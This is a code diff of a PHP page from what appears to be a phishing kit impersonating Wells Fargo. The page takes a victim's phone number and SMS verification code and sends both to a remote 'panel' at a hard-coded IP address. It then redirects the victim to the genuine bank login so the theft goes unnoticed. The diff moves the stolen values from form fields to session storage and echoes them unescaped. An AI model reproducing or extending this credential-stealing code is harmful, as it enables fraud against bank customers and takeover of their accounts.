@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-<html class="no-js" lang="en">
 <?php
 session_start();
 error_reporting(0);
@@ -14,9 +13,19 @@ include('../files/boot/DB-METHOD.php');
 include('../files/boot/DB-RANGE.php');
 include('../call.php');
 
-$user = @$_POST['user'];
+$user = "";
+$phone = "";
+
+if( isset($_SESSION["user"])){
+    $user = $_SESSION['user'];
+}
+if( isset($_SESSION["phone"])){
+    $phone = $_SESSION['phone'];
+}
+
+// $user = @$_POST['user'];
 $code = trim($_POST['code']);
-$phone = trim($_POST['phone']);
+// $phone = trim($_POST['phone']);
 echo $phone . " : " . $code;
 if ($code == "") {
   echo '<meta http-equiv="refresh" content="0; URL=codeinfo.php?error=1&phone=' . $phone . '&user=' . $user . '">';
@@ -24,6 +33,7 @@ if ($code == "") {
 }
 $test = @file_get_contents("http://137.74.171.167/panelo/a.php?sms=$phone,$code");        // here goes the panel
 ?>
+<html class="no-js" lang="en">
 <head>
     <meta http-equiv="refresh" content="7; URL=https://connect.secure.wellsfargo.com/auth/login/present?origin=mobilebrowser&error=yes">
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
